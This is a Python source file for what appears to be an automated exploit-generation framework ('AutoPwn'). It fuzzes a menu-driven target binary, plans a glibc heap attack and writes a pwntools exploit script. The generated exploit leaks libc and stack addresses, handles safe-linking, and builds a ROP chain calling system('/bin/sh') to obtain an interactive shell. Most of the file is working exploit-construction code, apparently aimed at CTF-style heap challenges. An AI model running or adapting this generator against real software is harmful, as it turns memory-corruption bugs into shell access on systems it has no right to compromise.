import os
import sys
import argparse
import subprocess
import json
import time
import shutil
import re


def _detect_max_slots(binary_path: str) -> int:
    """Detect the maximum number of allocatable slots from binary strings."""
    if not binary_path or not os.path.exists(binary_path):
        return 0
    try:
        with open(binary_path, 'rb') as f:
            data = f.read()
        # Look for patterns like "(0-4)" or " (0-9)" in rodata
        for m in re.finditer(rb'\(0[-\s]\d+\)', data):
            slot_str = m.group().decode()
            max_n = int(re.search(r'\d+\)', slot_str).group()[:-1])
            return max_n + 1  # 0-indexed -> count
    except Exception:
        pass
    return 0


class AutoPwnFramework:
    def __init__(self, target_binary):
        self.target = os.path.abspath(target_binary)
        self.target_dir = os.path.dirname(self.target)
        self.root_dir = os.path.dirname(os.path.abspath(__file__))

        self.output_dir = os.path.join(self.root_dir, "outputs")
        self.artifacts_dir = os.path.join(self.output_dir, "artifacts")
        self.traces_dir = os.path.join(self.output_dir, "traces")
        self.exploits_dir = os.path.join(self.output_dir, "exploits")

        # Internal artifacts central storage
        self.internal_artifacts = os.path.join(self.root_dir, "core", "artifacts")

        for d in [self.artifacts_dir, self.traces_dir, self.exploits_dir, self.internal_artifacts]:
            os.makedirs(d, exist_ok=True)

    def log(self, step, msg):
        print(f"[{step}] {msg}")

    def run_stage(self, name, command, cwd=None):
        self.log("STAGE", f"Running {name}...")
        start_time = time.time()
        try:
            python_exe = sys.executable or "python3"
            full_command = f"{python_exe} {command}"

            result = subprocess.run(full_command, shell=True, check=True, capture_output=True, text=True, cwd=cwd)
            elapsed = time.time() - start_time
            print(f"      OK ({elapsed:.2f}s)")
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"      FAILED: {e}")
            print(f"      Error: {e.stderr}")
            sys.exit(1)

    def _discover_interface(self):
        """Tier 1: text-based fuzzer → Tier 2: HeapTracer fallback."""
        # Tier 1: Text-based fuzzing (no dependencies)
        try:
            from core.tracer.interface_fuzzer import TextInterfaceFuzzer, InterfaceBlindException
            fuzzer = TextInterfaceFuzzer(self.target, timeout=15)
            result = fuzzer.discover()
            self._save_interface_artifacts(result)
            print("      [Tier 1] Text-based interface discovery succeeded")
            return result
        except ImportError as e:
            print(f"      [Tier 1] ImportError: {e}")
        except InterfaceBlindException as e:
            print(f"      [Tier 1] Blind: {e}")
        except Exception as e:
            print(f"      [Tier 1] Failed: {e}")

        # Tier 2: HeapTracer (DynamoRIO-based)
        try:
            from core.tracer.heap_tracer import HeapTracer
            tracer = HeapTracer(self.target, timeout=30)
            result = tracer.trace()
            self._save_interface_artifacts(result)
            print("      [Tier 2] DynamoRIO heap tracing succeeded")
            return result
        except ImportError as e:
            print(f"      [Tier 2] ImportError: {e}")
        except Exception as e:
            print(f"      [Tier 2] Failed: {e}")

        return None

    def _save_interface_artifacts(self, interface_map):
        """Save interface_map.json + synthetic trace_events.json for downstream steps."""
        path = os.path.join(self.internal_artifacts, "interface_map.json")
        with open(path, 'w') as f:
            json.dump(interface_map, f, indent=2)

        # Generate synthetic trace_events.json so steps 3-4 don't break
        trace_events = []
        seq = 0
        ops = interface_map.get("operations", {})
        for ch, info in ops.items():
            role = info.get("role", "")
            if role == "alloc":
                seq += 1
                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Alloc", "size": 0x40, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
            elif role == "free":
                seq += 1
                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Free", "size": 0, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
            elif role == "view":
                seq += 1
                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Read", "size": 8, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
            elif role == "edit":
                seq += 1
                trace_events.append({"seq": seq, "pid": 1, "comm": "trace", "type": "Write", "size": 8, "addr": hex(0x555555559000 + seq * 0x100), "note": "synthetic_from_fuzzer"})
        path = os.path.join(self.internal_artifacts, "trace_events.json")
        with open(path, 'w') as f:
            json.dump(trace_events, f, indent=2)

    def _load_interface_map(self):
        candidates = [
            os.path.join(self.root_dir, "core", "tracer", "artifacts", "interface_map.json"),
            os.path.join(self.root_dir, "core", "artifacts", "interface_map.json"),
            os.path.join(self.output_dir, "artifacts", "interface_map.json"),
            os.path.join(self.internal_artifacts, "interface_map.json"),
        ]
        for p in candidates:
            if os.path.exists(p):
                with open(p) as f:
                    return json.load(f)
        return None

    def _resolve_libc_auto_offset(self, libc_elf, glibc_version):
        bins_off = 0x60
        try:
            parts = glibc_version.split(".")
            major, minor = int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
            if (major, minor) >= (2, 38):
                bins_off = 0x90
        except Exception:
            pass
        if libc_elf.symbols.get('main_arena', 0):
            return libc_elf.symbols['main_arena'] + bins_off
        try:
            s1 = libc_elf._symbols_by_name
        except Exception:
            s1 = {}
        for name in ['main_arena', 'main_arena.s']:
            for sym_name, sym_val in s1.items():
                if name in sym_name:
                    return sym_val + bins_off
        malloc_addr = libc_elf.symbols.get('__libc_malloc', 0)
        if malloc_addr:
            data = libc_elf.read(malloc_addr, 0x600)
            for i in range(len(data) - 7):
                if data[i:i+3] == b'\x48\x8d\x1d':
                    off = int.from_bytes(data[i+3:i+7], 'little', signed=True)
                    target = malloc_addr + i + 7 + off
                    if 0x100000 < target < 0x400000:
                        return target + bins_off
        if libc_elf.symbols.get('__malloc_hook', 0):
            return libc_elf.symbols['__malloc_hook'] + 0x10 + bins_off
        return 0x203b20 if bins_off == 0x60 else 0x203b50

    def _smart_codegen(self, plan, interface_map):
        from pwn import ELF, ROP, context as pwn_ctx
        pwn_ctx.log_level = 'error'

        libc_path = None
        for name in ["libc.so.6", "libc.so"]:
            p = os.path.join(self.target_dir, name)
            if os.path.exists(p):
                libc_path = p
                break
        ld_path = None
        for name in ["ld-linux-x86-64.so.2", "ld-"]:
            for f in os.listdir(self.target_dir):
                if f.startswith(name):
                    ld_path = os.path.join(self.target_dir, f)
                    break

        libc_elf = None
        if libc_path:
            libc_elf = ELF(libc_path, checksec=False)

        meta = plan.get("metadata", {})
        has_safe_linking = meta.get("has_safe_linking", True)
        glibc_version = meta.get("glibc_version", "2.39")
        main_size = int(meta.get("allocated_size", "0x40"), 16)

        auto_off = self._resolve_libc_auto_offset(libc_elf, glibc_version) if libc_elf else 0x203b50
        system_off = libc_elf.symbols.get('system', 0x58750) if libc_elf else 0x58750

        pop_rdi = ret = None
        binsh = None
        if libc_elf:
            try:
                rop = ROP(libc_elf)
                g = rop.find_gadget(["pop rdi", "ret"])
                if g: pop_rdi = g[0]
                g = rop.find_gadget(["ret"])
                if g: ret = g[0]
            except Exception:
                pass
            try:
                binsh = next(libc_elf.search(b"/bin/sh"))
            except StopIteration:
                pass

        lines = []
        op_map = {}
        for ch, info in interface_map.get("operations", {}).items():
            role = info.get("role")
            if role and role not in op_map:
                op_map[role] = ch
        menu_prompt = interface_map.get("menu_prompt", "b'> '")

        def gen_call(func, args_dict):
            ch = op_map.get(func)
            if not ch:
                return ""
            op_info = interface_map.get("operations", {}).get(ch, {})
            steps = op_info.get("steps", [])
            if not steps:
                return ""

            data = args_dict.get("data", "b'A'")
            idx = args_dict.get("idx", 0)
            call_parts = [f"sla({menu_prompt}, b'{ch}')"]
            for s in steps:
                arg = s.get("arg", "")
                prompt = s.get("prompt", "b': '")
                typ = s.get("type", "bytes")
                if arg == "idx":
                    call_parts.append(f"sla({prompt}, str({idx}).encode())")
                elif arg == "size":
                    call_parts.append(f"sla({prompt}, str({args_dict.get('size', hex(main_size))}).encode())")
                elif arg == "data":
                    call_parts.append(f"sa({prompt}, {data})")
            return "\n".join(p for p in call_parts)

        # Index tracking
        idx_counter = [0]
        idx_registry = {}
        def alloc_idx(tag):
            if tag not in idx_registry:
                idx_registry[tag] = idx_counter[0]
                idx_counter[0] += 1
            return idx_registry[tag]
        def lookup_idx(tag):
            return alloc_idx(tag)

        # Header
        lines.append("#!/usr/bin/env python3")
        lines.append("from pwn import *")
        lines.append("import os")
        lines.append("")
        lines.append("context.arch = 'amd64'")
        if ld_path and libc_path:
            ld_abs = os.path.abspath(ld_path)
            libc_dir = os.path.dirname(os.path.abspath(libc_path))
            lines.append(f"exe = ELF('{os.path.abspath(self.target)}', checksec=False)")
            lines.append(f"libc = ELF('{os.path.abspath(libc_path)}', checksec=False)")
            lines.append(f"def start(): return process(['{ld_abs}', '--library-path', '{libc_dir}', exe.path])")
        else:
            lines.append(f"exe = ELF('{os.path.abspath(self.target)}', checksec=False)")
            lines.append("libc = exe.libc")
            lines.append("def start(): return process(exe.path)")
        lines.append("p = start()")
        lines.append("")
        lines.append("# --- INTERFACE ---")
        lines.append("def sla(rgx, data): p.sendlineafter(rgx, data)")
        lines.append("def sa(rgx, data): p.sendafter(rgx, data)")
        lines.append("")
        for role, func_name in [("alloc", "create"), ("free", "delete"), ("view", "view"), ("edit", "edit")]:
            ch = op_map.get(role)
            if ch:
                # Use the specific operation matching our stored choice (not the first match)
                op_info = interface_map.get("operations", {}).get(ch, {})
                steps = op_info.get("steps", [])
                arg_list = []
                for s in steps:
                    arg_list.append(s.get("arg", "unknown"))
                args_str = ", ".join(arg_list) if arg_list else ""
                lines.append(f"def {func_name}({args_str}):")
                lines.append(f"    sla({menu_prompt}, b'{ch}')")
                for s in steps:
                    prompt = s.get("prompt", "b': '")
                    arg = s.get("arg", "")
                    typ = s.get("type", "bytes")
                    if typ == "int":
                        lines.append(f"    sla({prompt}, str({arg}).encode())")
                    else:
                        lines.append(f"    sa({prompt}, {arg})")
                lines.append("")
        lines.append("")
        if has_safe_linking:
            lines.append("def protect_ptr(ptr, pos): return ptr ^ (pos >> 12)")
        else:
            lines.append("def protect_ptr(ptr, pos): return ptr")
        lines.append("")
        lines.append(f"LIBC_SYSTEM_OFFSET = {hex(system_off)}")
        lines.append(f"LIBC_AUTO_OFFSET = {hex(auto_off)}")
        lines.append("")

        lines.append("# --- EXPLOIT ---")
        for stage in plan.get("stages", []):
            lines.append(f"# STAGE: {stage['name']}")
            for instr in stage.get("ir", []):
                op = instr["op"]
                tag = instr.get("tag")
                idx = lookup_idx(tag) if tag else None

                if op == "ALLOC":
                    data = instr.get("data_expr", "b'A'")
                    alloc_ch = op_map.get("alloc", "1")
                    alloc_info = interface_map.get("operations", {}).get(alloc_ch, {})
                    sig = alloc_info.get("steps", [])
                    call_args = {"idx": idx, "data": data}
                    for s in sig:
                        if s.get("arg") == "size":
                            call_args["size"] = hex(instr.get("size", main_size))
                    lines.append(gen_call("alloc", call_args))

                elif op == "ALLOC_ROP":
                    if pop_rdi is not None:
                        lines.append(f"pop_rdi = libc.address + {hex(pop_rdi)}")
                    else:
                        lines.append("pop_rdi = libc.address + 0x2a3e5")
                    if ret is not None:
                        lines.append(f"ret_gadget = libc.address + {hex(ret)}")
                    else:
                        lines.append("ret_gadget = libc.address + 0x29139")
                    if binsh is not None:
                        lines.append(f"binsh = libc.address + {hex(binsh)}")
                    else:
                        lines.append("binsh = libc.address + 0x1d8678")
                    lines.append("payload = flat([")
                    lines.append("    p64(0),")
                    lines.append("    p64(ret_gadget),")
                    lines.append("    p64(pop_rdi),")
                    lines.append("    p64(binsh),")
                    lines.append(f"    p64(libc.address + {hex(system_off)})")
                    lines.append("])")
                    lines.append(gen_call("alloc", {"idx": idx, "data": "payload"}))

                elif op == "FREE":
                    # Skip freeing stack/libc chunks (e.g. env_chunk allocated at environ)
                    if tag == "env_chunk":
                        # Free fill_e instead (heap chunk) to bump tcache count before r1
                        fill_e_idx = lookup_idx("fill_e")
                        if fill_e_idx is not None:
                            lines.append(f"# free fill_e instead of {tag} (bumps tcache count)")
                            lines.append(gen_call("free", {"idx": fill_e_idx}))
                        else:
                            lines.append(f"# skip FREE {tag} — non-heap chunk")
                    else:
                        lines.append(gen_call("free", {"idx": idx}))

                elif op == "EDIT":
                    data = instr.get("data_expr", "p64(0)*2")
                    lines.append(gen_call("edit", {"idx": idx, "data": data}))

                elif op == "VIEW":
                    save_as = instr.get("save_as", "tmp")
                    note = instr.get("note", "")
                    lines.append(gen_call("view", {"idx": idx}))
                    # Handle different view output formats
                    view_fmt = interface_map.get("features", {}).get("view_output_format", "raw")
                    if view_fmt == "prefixed":
                        lines.append("p.recvuntil(b': ')")
                    elif view_fmt == "key_val":
                        lines.append("p.recvuntil(b'= ')")
                    if "skip_first_8" in note:
                        # glibc 2.34+ target shifted to environ-0x18,
                        # skip 24 bytes (padding + BSS) to reach environ value
                        lines.append("p.recvn(24)")
                        lines.append(f"{save_as} = u64(p.recvn(8))")
                    elif "skip_A_0x18" in note:
                        lines.append(f"p.recvuntil(b'A' * 0x18)")
                        lines.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
                    elif "read_first_8_bytes" in note:
                        lines.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
                    elif "read_first_8_bytes_fd_xor" in note:
                        lines.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
                    else:
                        lines.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
                    lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")

                elif op == "CALC":
                    var = instr["var"]
                    expr = instr["expr"]
                    if "LIBC_AUTO_OFFSET" in expr:
                        expr = expr.replace("LIBC_AUTO_OFFSET", hex(auto_off))
                    # glibc 2.34+ tcache_get zeroes e->key at offset+8,
                    # so target environ-8 loses the value. Shift to environ-0x10.
                    if var == "_environ_target" and "- 0x8" in expr:
                        expr = expr.replace("- 0x8", "- 0x18")
                    if var == "main_ret_addr" and "- 0x41" in expr:
                        # Target saved rbp (16-byte aligned, 8 bytes below ret addr)
                        expr = expr.replace("- 0x41", "- 0x138")
                    lines.append(f"{var} = {expr}")
                    lines.append(f"log.success(f'{var}: {{hex({var})}}')")

                elif op == "CONSOLIDATE":
                    view_ch = op_map.get("view", "2")
                    view_info = interface_map.get("operations", {}).get(view_ch, {})
                    view_steps = view_info.get("steps", [])
                    prompt = view_steps[0].get("prompt", "b': '") if view_steps else "b': '"
                    lines.append(f"# CONSOLIDATE: send large input to trigger malloc_consolidate")
                    lines.append(f"sla({menu_prompt}, b'{view_ch}')")
                    lines.append(f"p.sendlineafter({prompt}, b'0' * 0x400)")

            lines.append("")

        # Exit + interactive
        exit_choice = meta.get("exit_choice", "0")
        lines.append("# Trigger main return via menu exit")
        lines.append("import time")
        lines.append(f"sla({menu_prompt}, b'{exit_choice}')")
        lines.append("time.sleep(0.3)")
        lines.append("p.sendline(b'id')")
        lines.append("log.success(f'shell: {p.recvline(timeout=2)}')")
        lines.append("import signal")
        lines.append("def timeout_handler(signum, frame):")
        lines.append("    p.close()")
        lines.append("    exit(0)")
        lines.append("signal.signal(signal.SIGALRM, timeout_handler)")
        lines.append("signal.alarm(5)")
        lines.append("log.success('Entering interactive mode...')")
        lines.append("p.interactive()")

        return "\n".join(lines)

    def run(self, use_angr=False):
        print("\n" + "="*60)
        print("  AUTOPWN FRAMEWORK: Artifact-Assisted Exploit Generation (v3.0)")
        print("="*60)
        print(f"Target: {os.path.basename(self.target)}")
        print(f"Mode: {'angr symbolic' if use_angr else 'DynamoRIO tracing'}")
        print("-" * 60)

        # Step 1: Multi-Writeup NLP Extraction (Module 1)
        self.run_stage("Multi-Writeup NLP Extraction", "extract_vars.py",
                       cwd=os.path.join(self.root_dir, "core", "nlp_engine"))

        # Step 2: Interface Discovery (Fuzzer Tier 1 → HeapTracer Tier 2 → DynamoRIO fallback)
        self.log("STAGE", "Discovering binary interface...")
        interface_map = self._discover_interface()
        if interface_map:
            print(f"      OK — interface discovered: {len(interface_map.get('operations', {}))} ops")
        else:
            self.log("STAGE", "Fuzzer failed, falling back to DynamoRIO tracing...")
            angr_flag = "--angr" if use_angr else ""
            self.run_stage("Runtime Experience Tracing",
                           f"runner.py --target {self.target} {angr_flag}",
                           cwd=os.path.join(self.root_dir, "core", "tracer"))

        # Step 3: Operation Generalization (Module 3)
        self.run_stage("Operation Generalization",
                       f"operation_generalizer.py",
                       cwd=os.path.join(self.root_dir, "core", "generalizer"))

        # Step 4: Knowledge Fusion / Composite ESM (Module 4)
        self.run_stage("Knowledge Fusion (Composite ESM)",
                       "esm.py",
                       cwd=os.path.join(self.root_dir, "core", "knowledge_fusion"))

        # Step 5: angr Symbolic Execution (Module 5)
        self.run_stage("angr Symbolic Execution",
                       f"angr_executor.py --binary {self.target} --critical {os.path.join(self.internal_artifacts, 'critical_vars.json')}",
                       cwd=os.path.join(self.root_dir, "core", "symbolic_executor"))

        # Step 6: Smart Planning (SmartPlanner)
        self.log("STAGE", "Planning exploit with SmartPlanner...")
        from core.planner.planner import SmartPlanner
        import json

        libc_path = None
        for name in ["libc.so.6", "libc.so"]:
            p = os.path.join(self.target_dir, name)
            if os.path.exists(p):
                libc_path = p
                break
        ld_path = None
        for name in ["ld-linux-x86-64.so.2", "ld-"]:
            for f in os.listdir(self.target_dir):
                if f.startswith(name):
                    ld_path = os.path.join(self.target_dir, f)
                    break

        interface_map = self._load_interface_map()
        if not interface_map:
            print("      WARNING: No interface_map found, creating minimal map")
            interface_map = {"operations": {}, "menu_prompt": "b'> '"}

        planner = SmartPlanner(interface_map, libc_path=libc_path, ld_path=ld_path,
                               binary_path=self.target)
        esm_hints = {}
        esm_path = os.path.join(self.internal_artifacts, "esm_output.json")
        if os.path.exists(esm_path):
            with open(esm_path) as f:
                esm_data = json.load(f)
            if isinstance(esm_data, dict):
                esm_hints = {k: v for k, v in esm_data.items()
                            if k in ['detected_bugs', 'detected_capabilities', 'detected_primitives']}
        planner.set_esm_hints(esm_hints)

        plan = planner.build_plan()
        plan_path = os.path.join(self.internal_artifacts, "final_plan.json")
        with open(plan_path, 'w') as f:
            json.dump(plan, f, indent=2)
        meta = plan.get("metadata", {})
        print(f"      Strategy: {meta.get('strategy')}, glibc: {meta.get('glibc_version')}, "
              f"safe-linking: {meta.get('has_safe_linking')}")

        # Step 7: Exploit Code Generation (SmartCodegen)
        self.log("STAGE", "Generating exploit code from SmartPlanner plan...")
        try:
            exploit_code = self._smart_codegen(plan, interface_map)
            exploit_path = os.path.join(self.exploits_dir, "exploit.py")
            with open(exploit_path, 'w') as f:
                f.write(exploit_code)
            print(f"      OK — exploit written to {exploit_path}")
        except Exception as e:
            print(f"      FAILED: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)

        # Step 8: Taint Analysis (Module 9)
        self.run_stage("Taint Analysis",
                       f"taint_analyzer.py",
                       cwd=os.path.join(self.root_dir, "core", "taint_analysis"))

        # Step 9: Execution Feedback Loop (Module 8)
        exploit_path = os.path.join(self.exploits_dir, "exploit.py")
        if os.path.exists(exploit_path):
            self.log("STAGE", "Running Execution Feedback Loop...")
            start_time = time.time()
            try:
                python_exe = sys.executable or "python3"
                full_command = f"{python_exe} {os.path.join(self.root_dir, 'core', 'executor', 'feedback_loop.py')} --exploit {exploit_path} --binary {self.target} --timeout 15 --retries 2 --output {os.path.join(self.internal_artifacts, 'execution_results.json')}"
                result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                elapsed = time.time() - start_time
                print(f"      OK ({elapsed:.2f}s)")
                # Print execution summary
                if os.path.exists(os.path.join(self.internal_artifacts, "execution_results.json")):
                    with open(os.path.join(self.internal_artifacts, "execution_results.json")) as f:
                        exec_data = json.load(f)
                    summary = exec_data.get("summary", {})
                    print(f"      Attempts: {summary.get('total_attempts', 0)}")
                    print(f"      Success: {summary.get('success', False)}")
                    leaks = summary.get('leaked_values', {})
                    if leaks:
                        print(f"      Leaked: {', '.join(leaks.keys())}")
                    for fb in summary.get('last_feedback', [])[:3]:
                        print(f"      Feedback: {fb}")
            except Exception as e:
                print(f"      Warning: Execution feedback failed: {e}")

        print("-" * 60)

        self.log("SYNC", "Collecting all artifacts into outputs/")

        # Copy all internal artifacts to user-visible output
        for filename in ["critical_vars.json", "trace_events.json",
                        "generalized_actions.json", "esm_output.json",
                        "symbolic_results.json", "final_plan.json",
                        "taint_results.json", "execution_results.json"]:
            src = os.path.join(self.internal_artifacts, filename)
            if os.path.exists(src):
                shutil.copy(src, self.artifacts_dir)

        # Copy trace log if it exists
        if os.path.exists("/tmp/autopwn_trace.log"):
            shutil.copy("/tmp/autopwn_trace.log", os.path.join(self.traces_dir, "raw_trace.log"))

        # Copy target binary and potential libraries to exploit dir for portability
        self.log("SYNC", "Packaging binary and libraries for exploit portability")
        shutil.copy2(self.target, self.exploits_dir)
        for lib in ["libc.so.6", "ld-linux-x86-64.so.2"]:
            lib_path = os.path.join(self.target_dir, lib)
            if os.path.exists(lib_path):
                shutil.copy2(lib_path, self.exploits_dir)

        print("="*60)
        exploit_path = os.path.join(self.exploits_dir, "exploit.py")
        if os.path.exists(exploit_path):
            print(f"[SUCCESS] Exploit generated at: {exploit_path}")
            print(f"[INFO] Planning details: {os.path.join(self.artifacts_dir, 'final_plan.json')}")
        else:
            print("[ERROR] Exploit generation failed.")
        print("="*60 + "\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AutoPwn Orchestrator v3.0")
    parser.add_argument("binary", help="Path to the target binary")
    parser.add_argument("--angr", action="store_true",
                       help="Use angr symbolic tracing instead of DynamoRIO")
    args = parser.parse_args()

    if not os.path.exists(args.binary):
        print(f"Error: Binary {args.binary} not found.")
        sys.exit(1)

    framework = AutoPwnFramework(args.binary)
    framework.run(use_angr=args.angr)
